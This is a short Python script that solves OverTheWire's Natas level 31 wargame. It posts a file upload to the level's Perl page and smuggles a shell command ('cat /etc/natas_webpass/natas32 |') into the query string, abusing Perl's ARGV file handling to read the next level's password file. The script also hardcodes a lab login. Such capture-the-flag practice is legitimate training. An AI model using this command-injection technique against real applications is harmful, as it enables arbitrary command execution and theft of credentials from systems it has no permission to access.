import requests
from requests.auth import HTTPBasicAuth

url = "http://natas31.natas.labs.overthewire.org/index.pl"
auth = HTTPBasicAuth("natas31", "aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

files = {"file": ("test.csv")}

data = [("file", "ARGV")]

response = requests.post("http://natas31.natas.labs.overthewire.org/index.pl?cat%20/etc/natas_webpass/natas32%20%7C", auth=auth,  data=data, files=files)

print(response.text)